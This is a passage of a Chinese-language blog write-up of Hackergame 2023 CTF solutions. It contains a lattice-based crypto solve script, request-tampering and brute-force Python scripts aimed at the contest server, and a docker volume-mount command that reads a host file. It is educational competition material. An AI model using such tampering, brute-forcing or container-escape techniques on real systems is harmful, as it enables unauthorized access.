class=\"built_in\">bytes</span>.fromhex(enc(getvec(idx, <span class=\"string\">&#x27;40&#x27;</span>)))</span><br><span class=\"line\">    zero40 = getzero(c40)</span><br><span class=\"line\">    k40 = vec_recover(c40, c00, -<span class=\"number\">0x40</span>)</span><br><span class=\"line\">    k41 = vec_recover(c40, c00, <span class=\"number\">0x40</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">abs</span>(norm(vector(ZZ, most)-vector(ZZ, k40))) &lt; <span class=\"built_in\">abs</span>(norm(vector(ZZ, most)-vector(ZZ, k41))):</span><br><span class=\"line\">        xorflag ^= <span class=\"number\">0x40</span></span><br><span class=\"line\">    zero0040 = []</span><br><span class=\"line\">    zero4080 = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> zero00:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> i <span class=\"keyword\">in</span> zero40:</span><br><span class=\"line\">            zero0040.append(i)</span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\">        most[i] = bit_recover(c80[i], c40[i], (xorflag^<span class=\"number\">0x80</span>)-(xorflag^<span class=\"number\">0x40</span>))</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> zero80:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> i <span class=\"keyword\">in</span> zero40:</span><br><span class=\"line\">            zero4080.append(i)</span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\">        most[i] = bit_recover(c40[i], c00[i], (xorflag^<span class=\"number\">0x40</span>)-xorflag)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(zero0040+zero4080+zero0080) == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> most</span><br><span class=\"line\">    c20 = <span class=\"built_in\">bytes</span>.fromhex(enc(getvec(idx, <span class=\"string\">&#x27;20&#x27;</span>)))</span><br><span class=\"line\">    k20 = vec_recover(c20, c00, <span class=\"number\">0x20</span>)</span><br><span class=\"line\">    k21 = vec_recover(c20, c00, -<span class=\"number\">0x20</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">abs</span>(norm(vector(ZZ, most)-vector(ZZ, k20))) &gt; <span class=\"built_in\">abs</span>(norm(vector(ZZ, most)-vector(ZZ, k21))):</span><br><span class=\"line\">        xorflag ^= <span class=\"number\">0x20</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> zero0040:</span><br><span class=\"line\">        most[i] = bit_recover(c80[i], c20[i], (xorflag^<span class=\"number\">0x80</span>)-(xorflag^<span class=\"number\">0x20</span>))</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> zero4080:</span><br><span class=\"line\">        most[i] = bit_recover(c20[i], c00[i], (xorflag^<span class=\"number\">0x20</span>)-xorflag)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> zero0080:</span><br><span class=\"line\">        most[i] = bit_recover(c40[i], c20[i], (xorflag^<span class=\"number\">0x40</span>)-(xorflag^<span class=\"number\">0x20</span>))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> most</span><br><span class=\"line\">    </span><br><span class=\"line\">m = []</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> tqdm(<span class=\"built_in\">range</span>(<span class=\"number\">128</span>)):</span><br><span class=\"line\">    m.append(diff_attack(i))</span><br><span class=\"line\">success(<span class=\"string\">&#x27;recover key in &#123;&#125; times&#x27;</span>.<span class=\"built_in\">format</span>(times))</span><br><span class=\"line\"></span><br><span class=\"line\">c = <span class=\"built_in\">bytes</span>.fromhex(enc(<span class=\"string\">&#x27;0&#x27;</span>*<span class=\"number\">255</span>+<span class=\"string\">&#x27;1&#x27;</span>))</span><br><span class=\"line\">M = matrix(GF(<span class=\"number\">257</span>), m).transpose()</span><br><span class=\"line\">result = (M**(-<span class=\"number\">1</span>)) * vector(GF(<span class=\"number\">257</span>), <span class=\"built_in\">list</span>(c))</span><br><span class=\"line\">flag = <span class=\"string\">&#x27;&#x27;</span>.join([<span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(i)) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> result])</span><br><span class=\"line\">flag1 = flag.split(<span class=\"string\">&#x27;\\n&#x27;</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">success(<span class=\"string\">&#x27;flag1: &#x27;</span>+flag1)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># V = (M - matrix.identity(128)).right_kernel().basis_matrix()</span></span><br><span class=\"line\"><span class=\"comment\"># v = V[0]</span></span><br><span class=\"line\"><span class=\"comment\"># print(v)</span></span><br><span class=\"line\"><span class=\"comment\"># v = bytes(v)</span></span><br><span class=\"line\"><span class=\"comment\"># v = hex(bytes_to_long(v))[2:].zfill(256)</span></span><br><span class=\"line\"><span class=\"comment\"># print(v,len(v))</span></span><br><span class=\"line\"><span class=\"comment\"># r.sendlineafter(b&#x27;&gt;&#x27;, v.encode())</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">cvp</span>(<span class=\"params\">M, v, d=<span class=\"number\">2</span>**<span class=\"number\">10</span>, mothod=<span class=\"string\">&#x27;BKZ&#x27;</span></span>):</span><br><span class=\"line\">    p = M.base_ring().characteristic()</span><br><span class=\"line\">    M = M.change_ring(ZZ)</span><br><span class=\"line\">    v = v.change_ring(ZZ)</span><br><span class=\"line\">    M = M.stack(matrix.identity(M.ncols())*p)</span><br><span class=\"line\">    M = M.stack(-v)</span><br><span class=\"line\">    M = M.augment(vector(ZZ, [<span class=\"number\">0</span>]*(M.nrows()-<span class=\"number\">1</span>)+[d]))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> mothod == <span class=\"string\">&#x27;LLL&#x27;</span>:</span><br><span class=\"line\">        M = M.LLL()</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        M = M.BKZ()</span><br><span class=\"line\">    vv = vector(ZZ, M[-<span class=\"number\">1</span>][:-<span class=\"number\">1</span>])</span><br><span class=\"line\">    <span class=\"keyword\">return</span> vv+v</span><br><span class=\"line\"></span><br><span class=\"line\">Z = (M - matrix.identity(<span class=\"number\">128</span>)).right_kernel().basis_matrix()</span><br><span class=\"line\">v = cvp(Z, vector(ZZ, [<span class=\"number\">0x50</span>]*<span class=\"number\">128</span>))</span><br><span class=\"line\">v = <span class=\"built_in\">hex</span>(bytes_to_long(<span class=\"built_in\">bytes</span>(<span class=\"built_in\">list</span>(v))))[<span class=\"number\">2</span>:].zfill(<span class=\"number\">256</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">b&#x27;&gt;&#x27;</span>, v.encode())</span><br><span class=\"line\"></span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b&#x27;[+] unbelievable !!! You are an excellent hacker!\\n&#x27;</span>)</span><br><span class=\"line\">flag2 = r.readline().decode().strip()</span><br><span class=\"line\">success(<span class=\"string\">&#x27;flag2: &#x27;</span>+flag2)</span><br><span class=\"line\"></span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b&#x27;[+] how can you find such an exquisite solution?\\n&#x27;</span>)</span><br><span class=\"line\">flag3 = r.readline().decode().strip()</span><br><span class=\"line\">success(<span class=\"string\">&#x27;flag3: &#x27;</span>+flag3)</span><br><span class=\"line\"></span><br><span class=\"line\">r.close()</span><br></pre></td></tr></table></figure>\n","excerpt":"<p>打 Hackergame 的第三年。</p>","more":"<h2 id=\"Summary\"><a href=\"#Summary\" class=\"headerlink\" title=\"Summary\"></a>Summary</h2><p>又是一年 Hackergame，今年终于进了一次前 100，总排 72，math 榜也能看到我。<br>开赛的时候在东校参加迎新大会，校巴的上车点和下车点竟然是不一样的，没坐上回去的车，最后还得自己买高铁，要是校巴还报销不了的话是真的想似了。<br>GZTime 还是直线上分，每年的保留节目了属于是。ZRHan 也打到了第 9，我校首次在 hg 前十里占两席。mcfx 也又 AK 了，现在的我没以前那么菜了，才更觉得他的数学水平简直不像人，甚至有种比春哥还强一大截的感觉，有空得翻翻他 blog，看看能不能淘到点什么。<br>打到一半的时候我实在受不了这一天比一天卡的电脑了，就重装了一下系统，这下啥环境都没了，装 sagemath 也装了半天，好在最后装好了，但也因此几乎停止了上分。</p>\n<hr>\n<h2 id=\"签到\"><a href=\"#签到\" class=\"headerlink\" title=\"签到\"></a>签到</h2><p>虽然做了两年签到的我大概也能猜到什么套路，但还是玩了一下。<br>要求喊出 “Hackergame 启动！” 并且相似度要达到 99.9% 才能拿到 flag，直接随便意思一句点提交，url 出现 <code>?similarity=77.5930335706637</code>，直接改成 100，回车。<br>点击获取 flag，然后我屏幕就白了，然后。。。见白知原好吧。</p>\n<h2 id=\"猫咪小测\"><a href=\"#猫咪小测\" class=\"headerlink\" title=\"猫咪小测\"></a>猫咪小测</h2><ol>\n<li><p>想要借阅世界图书出版公司出版的《A Classical Introduction To Modern Number Theory 2nd ed.》，应当前往中国科学技术大学西区图书馆的哪一层？（30 分）<br>手动爆破，12 层，还挺高。</p>\n</li>\n<li><p>今年 arXiv 网站的天体物理版块上有人发表了一篇关于「可观测宇宙中的鸡的密度上限」的论文，请问论文中作者计算出的鸡密度函数的上限为 10 的多少次方每立方秒差距？（30 分）<br>提示：是一个非负整数。<br>脚本爆破，代码如下：</p>\n <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests <span class=\"keyword\">as</span> r</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">from</span> tqdm <span class=\"keyword\">import</span> tqdm</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">crack</span>(<span class=\"params\">q2</span>):</span><br><span class=\"line\">    url = <span class=\"string\">&#x27;http://202.38.93.111:10001/&#x27;</span></span><br><span class=\"line\">    payload = &#123;<span class=\"string\">&#x27;q1&#x27;</span>: <span class=\"string\">&#x27;12&#x27;</span>, <span class=\"string\">&#x27;q2&#x27;</span>: q2,</span><br><span class=\"line\">            <span class=\"string\">&#x27;q3&#x27;</span>: <span class=\"string\">&#x27;12&#x27;</span>, <span class=\"string\">&#x27;q4&#x27;</span>: <span class=\"number\">0</span>&#125;</span><br><span class=\"line\">    headers = &#123;<span class=\"string\">&#x27;Cookie&#x27;</span>: <span class=\"string\">&#x27;session=eyJ0b2tlbiI6IjcxNDpNRVVDSUMwTFByNHBrS3QyQmwrU3dCQUpVbE1wdldmRU1wSzIyeTcxYzVxV3diTmFBaUVBcXVUYTFxS3kxYXdYOGxnc0lBOExtK215NEZ1RlB3SEVvM053cnJXZGJlND0ifQ.ZT3Olw.PIfDty1-kKuL1PSgMf8Et1GIJv4&#x27;</span>&#125;</span><br><span class=\"line\">    res = r.post(url, headers=headers, data=payload).text</span><br><span class=\"line\">    pat = re.<span class=\"built_in\">compile</span>(<span class=\"string\">r&#x27;(\\d+)。&#x27;</span>)</span><br><span class=\"line\">    score = re.findall(pat, res)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">int</span>(score[<span class=\"number\">0</span>])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">100</span>):</span><br><span class=\"line\">    res = crack(<span class=\"built_in\">str</span>(i))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> res == <span class=\"number\">60</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(i)</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure></li>\n<li><p>为了支持 TCP BBR 拥塞控制算法，在编译 Linux 内核时应该配置好哪一条内核选项？（20 分）<br>提示：输入格式为 CONFIG_XXXXX，如 CONFIG_SCHED_SMT。<br>问一下 GPT 就行，直接就出 <code>CONFIG_TCP_CONG_BBR</code> 了。</p>\n</li>\n<li><p>🥒🥒🥒：「我……从没觉得写类型标注有意思过」。在一篇论文中，作者给出了能够让 Python 的类型检查器 MyPY mypy 陷入死循环的代码，并证明 Python 的类型检查和停机问题一样困难。请问这篇论文发表在今年的哪个学术会议上？（20 分）<br>提示：会议的大写英文简称，比如 ISCA、CCS、ICML。<br>搜一下就有，找到 Python Type Hints are Turing Complete 这篇文章，在 ECOOP 发表。</p>\n</li>\n</ol>\n<h2 id=\"更深更暗\"><a href=\"#更深更暗\" class=\"headerlink\" title=\"更深更暗\"></a>更深更暗</h2><p>水题，F12，随便展开一下元素就找到 flag 了。</p>\n<h2 id=\"旅行照片-3-0\"><a href=\"#旅行照片-3-0\" class=\"headerlink\" title=\"旅行照片 3.0\"></a>旅行照片 3.0</h2><p>可以直接看官方 wp。学长晚上的行程注意看脖子上带子的文字就行。</p>\n<h2 id=\"赛博井字棋\"><a href=\"#赛博井字棋\" class=\"headerlink\" title=\"赛博井字棋\"></a>赛博井字棋</h2><p>霸道的力量，用 hackerbar 下到人机下过的位置就行。</p>\n<h2 id=\"奶奶的睡前-flag-故事\"><a href=\"#奶奶的睡前-flag-故事\" class=\"headerlink\" title=\"奶奶的睡前 flag 故事\"></a>奶奶的睡前 flag 故事</h2><p>截图漏洞，之前见过 Windows 的，谷歌的亲儿子手机就是 Pixel，直接搜 Pixel screenshot hack 就行了。找到网站，手机型号选择最新的不行，换个老点的就可以了。</p>\n<h2 id=\"组委会模拟器\"><a href=\"#组委会模拟器\" class=\"headerlink\" title=\"组委会模拟器\"></a>组委会模拟器</h2><p>F12 看下请求，发现会先拿到全部 1000 条消息，包含消息 id、内容和时间，点击消息会发消息的 id 到服务端，这样的话我们用 python 直接梭就行了。<br>注意要按时间发包，不然会返回“发生了时空穿越”的失败提示。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests <span class=\"keyword\">as</span> r</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">from</span> tqdm <span class=\"keyword\">import</span> tqdm</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">&#x27;http://202.38.93.111:10021/api/getMessages&#x27;</span></span><br><span class=\"line\">headers = &#123;<span class=\"string\">&#x27;Cookie&#x27;</span>: &lt;cookie&gt;&#125;</span><br><span class=\"line\">res = r.post(url, headers=headers).text</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delmsg</span>(<span class=\"params\">idd</span>):</span><br><span class=\"line\">    url = <span class=\"string\">&#x27;http://202.38.93.111:10021/api/deleteMessage&#x27;</span></span><br><span class=\"line\">    headers = &#123;<span class=\"string\">&#x27;Cookie&#x27;</span>: &lt;cookie&gt;,</span><br><span class=\"line\">               <span class=\"string\">&#x27;Content-Type&#x27;</span>: <span class=\"string\">&#x27;application/json&#x27;</span>,&#125;</span><br><span class=\"line\">    data = &#123;<span class=\"string\">&#x27;id&#x27;</span>: idd&#125;</span><br><span class=\"line\">    res = r.post(url, headers=headers, data=json.dumps(data)).text</span><br><span class=\"line\">    res = json.loads(res)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> res[<span class=\"string\">&#x27;success&#x27;</span>] == <span class=\"literal\">True</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> res[<span class=\"string\">&#x27;error&#x27;</span>]</span><br><span class=\"line\">start_time = time.time()</span><br><span class=\"line\"></span><br><span class=\"line\">js = json.loads(res)</span><br><span class=\"line\">msg = js[<span class=\"string\">&#x27;messages&#x27;</span>]</span><br><span class=\"line\">msg = <span class=\"built_in\">list</span>(msg)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> m <span class=\"keyword\">in</span> msg:</span><br><span class=\"line\">    pat = re.<span class=\"built_in\">compile</span>(<span class=\"string\">r&#x27;hack\\[[a-z]+\\]&#x27;</span>)</span><br><span class=\"line\">    flag = re.search(pat, m[<span class=\"string\">&#x27;text&#x27;</span>])</span><br><span class=\"line\">    <span class=\"keyword\">if</span> flag:</span><br><span class=\"line\">        m[<span class=\"string\">&#x27;flag&#x27;</span>] = <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        m[<span class=\"string\">&#x27;flag&#x27;</span>] = <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># with open(&#x27;output.txt&#x27;, &#x27;w+&#x27;) as f:</span></span><br><span class=\"line\"><span class=\"comment\">#     for m in msg:</span></span><br><span class=\"line\"><span class=\"comment\">#         f.write(f&quot;&#123;m[&#x27;flag&#x27;]&#125; &#123;m[&#x27;text&#x27;]&#125;\\n&quot;)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> tqdm(<span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(msg))):</span><br><span class=\"line\">    txt = msg[i][<span class=\"string\">&#x27;text&#x27;</span>]</span><br><span class=\"line\">    delay = msg[i][<span class=\"string\">&#x27;delay&#x27;</span>]</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        current_time = time.time() - start_time</span><br><span class=\"line\">        <span class=\"keyword\">if</span> current_time &gt; delay:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> msg[i][<span class=\"string\">&#x27;flag&#x27;</span>]:</span><br><span class=\"line\">                res = delmsg(i)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> res != <span class=\"literal\">True</span>:</span><br><span class=\"line\">                    <span class=\"built_in\">print</span>(txt)</span><br><span class=\"line\">                    <span class=\"built_in\">print</span>(res)</span><br><span class=\"line\">                <span class=\"keyword\">break</span>  <span class=\"comment\"># 添加退出条件</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">break</span>  <span class=\"comment\"># 添加退出条件</span></span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">&#x27;http://202.38.93.111:10021/api/getflag&#x27;</span></span><br><span class=\"line\">res = r.post(url, headers=headers).text</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(json.loads(res))</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"虫\"><a href=\"#虫\" class=\"headerlink\" title=\"虫\"></a>虫</h2><p>SSTV，在 github 找个 <a href=\"https://github.com/colaclanth/sstv\">Decoder</a> 就行，舍友还在那播放，太折磨了（）。</p>\n<h2 id=\"JSON-⊂-YAML\"><a href=\"#JSON-⊂-YAML\" class=\"headerlink\" title=\"JSON ⊂ YAML?\"></a>JSON ⊂ YAML?</h2><p>第一问 GPT 给出的答案五花八门，但是都不行，最后还是去找了文档一个个试试出来的浮点数可以触发。<br>第二问 GPT 倒是好使，直接说两个相同的 key 会触发。<br>两个 payload 分别是 <code>&#123;&quot;null&quot;: -2E+05&#125;</code> 和 <code>&#123;&quot;null&quot;: &quot;yes&quot;,&quot;null&quot;:&quot;no&quot;&#125;</code>。</p>\n<h2 id=\"Git-Git-叹号\"><a href=\"#Git-Git-叹号\" class=\"headerlink\" title=\"Git? Git 叹号\"></a>Git? Git 叹号</h2><p>（标题直接打 ！的话 markdown 报错，看着难受）<br>问了 GPT，让我用 <code>reflog</code>，如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git reflog</span><br><span class=\"line\">ea49f0c (HEAD -&gt; main) HEAD@&#123;0&#125;: commit: Trim trailing spaces</span><br><span class=\"line\">15fd0a1 (origin/main, origin/HEAD) HEAD@&#123;1&#125;: reset: moving to HEAD~</span><br><span class=\"line\">505e1a3 HEAD@&#123;2&#125;: commit: Trim trailing spaces</span><br><span class=\"line\">15fd0a1 (origin/main, origin/HEAD) HEAD@&#123;3&#125;: <span class=\"built_in\">clone</span>: from https://github.com/dair-ai/ML-Course-Notes.git</span><br></pre></td></tr></table></figure>\n\n<p>可以看到，15fd0a1 是撤销的操作，我们用 <code>diff</code> 看一下修改了什么就行了：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git diff 505e1a3 15fd0a1 --patch</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"HTTP-集邮册\"><a href=\"#HTTP-集邮册\" class=\"headerlink\" title=\"HTTP 集邮册\"></a>HTTP 集邮册</h2><p>前面两问胡乱试几下就有了。<br>最后一问没搞出来。</p>\n<h2 id=\"Docker-for-Everyone\"><a href=\"#Docker-for-Everyone\" class=\"headerlink\" title=\"Docker for Everyone\"></a>Docker for Everyone</h2><p>告诉一下 GPT 可以执行 <code>docker</code> 命令，就给出 payload 了</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -v /dev/shm:/dev/shm --<span class=\"built_in\">rm</span> -it alpine <span class=\"built_in\">cat</span> /dev/shm/flag</span><br></pre></td></tr></table></figure>\n\n<p>还解释得挺详细：</p>\n<blockquote>\n<p>在这个命令中：<br>docker run 是用来创建并运行一个新容器的命令。<br>-v /dev/shm:/dev/shm 是一个卷参数，它将主机上的/dev/shm目录挂载到容器的/dev/shm目录。<br>–rm 是一个选项，它会在容器退出时删除容器，以避免留下任何残留数据。<br>-it 是一个选项，它会为容器提供一个交互式终端。<br>alpine 是你想要运行的容器镜像的名称。<br>cat /dev/shm/flag 是你想在容器内运行的命令，它会尝试读取并输出/dev/shm/flag的内容。</p>\n</blockquote>\n<h2 id=\"惜字如金-2-0\"><a href=\"#惜字如金-2-0\" class=\"headerlink\" title=\"惜字如金 2.0\"></a>惜字如金 2.0</h2><p>手调即可。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Th siz of th fil may reduc after XZRJification</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">check_equals</span>(<span class=\"params\">left, right</span>):</span><br><span class=\"line\">    <span class=\"comment\"># check whether left == right or not</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> left != right: <span class=\"keyword\">raise</span> ValueError</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_code_dict</span>():</span><br><span class=\"line\">    <span class=\"comment\"># prepar th cod dict</span></span><br><span class=\"line\">    code_dict = []</span><br><span class=\"line\">    code_dict += [<span class=\"string\">&#x27;nymeh1niwemflcir&#125;echaet0&#x27;</span>]   <span class=\"comment\"># 0-23</span></span><br><span class=\"line\">    code_dict += [<span class=\"string\">&#x27;a3g7&#125;kidgojernoetlsup?h0&#x27;</span>]   <span class=\"comment\"># 24-47</span></span><br><span class=\"line\">    code_dict += [<span class=\"string\">&#x27;uulw!f5soadrhwnrsnstnoeq&#x27;</span>]   <span class=\"comment\"># 48-71</span></span><br><span class=\"line\">    code_dict += [<span class=\"string\">&#x27;ct.&#123;l-findiehaai&#123;oveatas&#x27;</span>]   <span class=\"comment\"># 72-95</span></span><br><span class=\"line\">    code_dict += [<span class=\"string\">&#x27;ty9kxborszst.guyd?!blm-p&#x27;</span>]   <span class=\"comment\"># 96-119</span></span><br><span class=\"line\">    <span class=\"comment\"># print(len(code_dict[0]))</span></span><br><span class=\"line\">    <span class=\"comment\"># print(set(len(s) for s in code_dict))</span></span><br><span class=\"line\">    check_equals(<span class=\"built_in\">set</span>(<span class=\"built_in\">len</span>(s) <span class=\"keyword\">for</span> s <span class=\"keyword\">in</span> code_dict), &#123;<span class=\"number\">24</span>&#125;)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&#x27;&#x27;</span>.join(code_dict)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">decrypt_data</span>(<span class=\"params\">input_codes</span>):</span><br><span class=\"line\">    <span class=\"comment\"># retriev th decrypted data</span></span><br><span class=\"line\">    code_dict = get_code_dict()</span><br><span class=\"line\">    output_chars = [code_dict[c] <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> input_codes]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&#x27;&#x27;</span>.join(output_chars)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    <span class=\"comment\"># check som obvious things</span></span><br><span class=\"line\">    check_equals(<span class=\"string\">&#x27;creat&#x27;</span>, <span class=\"string\">&#x27;cre&#x27;</span> + <span class=\"string\">&#x27;at&#x27;</span>)</span><br><span class=\"line\">    check_equals(<span class=\"string\">&#x27;referrer&#x27;</span>, <span class=\"string\">&#x27;refer&#x27;</span> + <span class=\"string\">&#x27;rer&#x27;</span>)</span><br><span class=\"line\">    <span class=\"comment\"># check th flag</span></span><br><span class=\"line\">    flag = decrypt_data([<span class=\"number\">53</span>, <span class=\"number\">41</span>, <span class=\"number\">85</span>, <span class=\"number\">109</span>, <span class=\"number\">75</span>, <span class=\"number\">1</span>, <span class=\"number\">33</span>, <span class=\"number\">48</span>, <span class=\"number\">77</span>, <span class=\"number\">90</span>,</span><br><span class=\"line\">                         <span class=\"number\">17</span>, <span class=\"number\">118</span>, <span class=\"number\">36</span>, <span class=\"number\">25</span>, <span class=\"number\">13</span>, <span class=\"number\">89</span>, <span class=\"number\">90</span>, <span class=\"number\">3</span>, <span class=\"number\">63</span>, <span class=\"number\">25</span>,</span><br><span class=\"line\">                         <span class=\"number\">31</span>, <span 